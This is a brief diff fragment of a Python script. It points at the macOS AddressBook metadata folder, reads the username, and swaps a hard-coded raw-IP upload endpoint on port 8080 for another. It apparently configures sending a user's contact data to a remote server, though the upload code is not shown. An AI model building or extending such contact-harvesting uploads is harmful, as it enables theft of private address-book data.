@@ -14,7 +14,7 @@ home = expanduser("~")
 
 clocation = home + "/Library/Application Support/AddressBook/Metadata/"
 
-uploadlink = "http://146.148.56.181:8080/"
+uploadlink = "http://142.93.195.87:8080/"
 # uploadlink = "http://localhost:8080/"
 
 user = getpass.getuser()
